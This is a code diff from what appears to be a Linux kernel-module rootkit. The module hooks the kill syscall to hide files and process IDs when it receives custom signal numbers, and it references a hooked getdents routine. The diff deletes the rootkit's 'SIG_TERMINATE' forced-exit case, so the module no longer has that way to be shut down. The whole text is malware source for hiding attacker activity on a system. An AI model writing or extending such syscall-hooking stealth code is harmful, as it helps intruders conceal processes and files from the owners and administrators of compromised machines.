@@ -27,7 +27,6 @@
 #define SIG_HIDE 33
 #define SIG_UNHIDE 34
 #define SIG_HIDEPID 35
-#define SIG_TERMINATE 99
 
 // this is the filename we want to hide
 // used in hacked_getdents(...)
@@ -113,10 +112,6 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
         case SIG_HIDEPID:
             pr_info("Hiding the PID %d,\n",pid);
             sprintf(hidePID, "%d", pid);
-            break;
-        case SIG_TERMINATE:
-            pr_info("Forcing rootkit exit\n");
-            //module_exit(lkm_example_exit);
             break;
         default:
             return original_kill(pid, sig);
